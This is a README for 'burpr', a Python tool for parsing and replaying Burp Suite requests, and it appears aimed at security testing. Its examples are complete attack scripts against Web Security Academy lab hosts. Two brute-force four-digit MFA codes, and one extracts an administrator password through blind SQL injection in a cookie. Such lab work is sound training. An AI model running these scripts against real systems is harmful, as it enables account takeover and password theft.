# What is it
A Burp Suite request parser, used for aid in assessing application security functionality.

# Why I wrote it
To use Burp Suite captured requests without relying on intruder.

# Installation
```
pip install burpr
```

# Usage
Use burpr.py module to parse the Burp Suite copied request. Then use the created object to extract headers and body.

Supports parsing requests as strings and as .txt files.

```python
import burpr

# Load from string
req = burpr.parse_string(req_string)

# Load from file
req = burpr.parse_file(req_file_path)

# clone the request
req_clone = burpr.clone(req)

# change protocol to http1.1
req_clone.set_protocol(burpr.protocols.HTTP1_1)

# change transport to http
req_clone.set_transport(burpr.transports.HTTP)

# modify the header
req_clone.set_header("Cookie", "session=modified_session_cookie")

# modify the parameter
req_clone.set_parameter("post-param", "AAABBBCCC")

# remove parameter
req_clone.remove_parameter("post-param")

# remove header
req_clone.remove_header("Cookie")

# adjust Content-Length for parameter change
burpr.prepare(req_clone)

client = httpx.Client(http2=True)
res = client.post(req.url, headers=req.headers, data=req.body)
```

# Examples
## Brute force broken MFA
```python
import burpr
import httpx
import itertools

burp_request = r"""POST /login2 HTTP/2
Host: xxxx.web-security-academy.net
Cookie: verify=carlos; session=xxxx
Content-Length: 13
Cache-Control: max-age=0
Sec-Ch-Ua: 
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: ""
Upgrade-Insecure-Requests: 1
Origin: https://xxxx.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.111 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://xxxx.web-security-academy.net/login2
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9

mfa-code=4321
"""

def generate_pin_numbers():
  return [''.join(list([str(digit) for digit in permutation])) 
          for permutation in itertools.product(list(range(0, 10)), repeat=4)]

def brute_force_broken_mfa():
  # Parse request from string
  req = burpr.parse_string(burp_request)

  # Create http client and check the protocol used
  client = httpx.Client(http2=req.is_http2)

  for pin in generate_pin_numbers():
    # Modify the mfa-code parameter
    req.set_parameter("mfa-code", pin)

    # Send the request
    res = client.post(req.url, headers=req.headers, data=req.body)

    print(res.status_code, pin)
    
    if (res.status_code != 200):
      break

brute_force_broken_mfa()
```

## Brute force stricter broken MFA
```python
import burpr
import httpx 
from bs4 import BeautifulSoup
import itertools


def generate_pin_numbers():
  return [''.join(list([str(digit) for digit in permutation])) 
          for permutation in itertools.product(list(range(0, 10)), repeat=4)]

def brute_force_stricter_broken_mfa():
    victim_login = "xxx"
    victim_pass = "xxx"

    burp_login_get = burpr.parse_file("./login-get.txt")
    burp_login_post  = burpr.parse_file("./login-post.txt")
    burp_login_mfa_get = burpr.parse_file("./login-mfa-get.txt")
    burp_login_mfa_post = burpr.parse_file("./login-mfa-post.txt")

    client = httpx.Client(http2=True)

    for pin in generate_pin_numbers():
        # Get CSRF token and session
        req = burpr.clone(burp_login_get)

        res = client.get(req.url, headers=req.headers)
        
        soup = BeautifulSoup(res, "html.parser")
        session = res.headers.get("set-cookie")
        csrf = soup.find(attrs={"name": "csrf"})["value"]

        # Log in
        req = burpr.clone(burp_login_post)

        req.set_header("Cookie", session)
        req.set_parameter("csrf", csrf)
        req.set_parameter("username", victim_login),
        req.set_parameter("password", victim_pass)
        burpr.prepare(req)

        res = client.post(req.url, headers=req.headers, data=req.body)

        # Get CSRF token and session
        req = burpr.clone(burp_login_mfa_get)

        session = res.headers.get("set-cookie")
        req.set_header("Cookie", session)
        burpr.prepare(req)

        res = client.get(req.url, headers=req.headers)
        soup = BeautifulSoup(res, "html.parser")
        csrf = soup.find(attrs={"name": "csrf"})["value"]

        # Attempt another MFA pin guess and start again
        req = burpr.clone(burp_login_mfa_post)

        req.set_header("Cookie", session)
        req.set_parameter("csrf", csrf)
        req.set_parameter("username", victim_login),
        req.set_parameter("password", victim_pass)
        req.set_parameter("mfa-code", pin)
        burpr.prepare(req)

        res = client.post(req.url, headers=req.headers, data=req.body)

        print(pin)

        if res.status_code != 200:
            print(res.status_code, pin, res.headers, res.text)
            break

brute_force_stricter_broken_mfa()
```
## Blind SQL injection with conditional responses
``` python
import burpr
import httpx
import sys

burp_req = r'''GET /filter?category=Gifts HTTP/2
Host: xxxx.web-security-academy.net
Cookie: TrackingId=aaaabbbbbcccccdddddd; session=aaaabbbbbcccccdddddd
Sec-Ch-Ua: 
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: ""
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5790.171 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://xxxx.web-security-academy.net/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9'''

alphabet = "abcdefghijklmnopqrstuvwxyz1234567890!@#$%^&*()_-+="

# determine password length
req = burpr.parse_string(burp_req)
client = httpx.Client(http2=True)

length = 0
while length < 255:
  payload = f"' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)={length + 1})='a"

  req.set_header("Cookie", f"TrackingId=aaaabbbbbcccccdddddd{payload}; session=aaaabbbbbcccccdddddd")
  res = client.get(req.url, headers=req.headers)
  
  length = length + 1

  if "Welcome back" in res.text:
    break

print(f"[*] Password length is {length}, retrieving password:")

# retrieve password
for i in range(length):
  for letter in alphabet:
    payload = f"' AND (SELECT SUBSTRING(password,{i + 1},1) FROM users WHERE username='administrator')='{letter}"

    req.set_header("Cookie", f"TrackingId=aaaabbbbbcccccdddddd{payload}; session=aaaabbbbbcccccdddddd")
    res = client.get(req.url, headers=req.headers)
  
    if "Welcome back" in res.text:
      sys.stdout.write(letter)
      sys.stdout.flush()
      break
```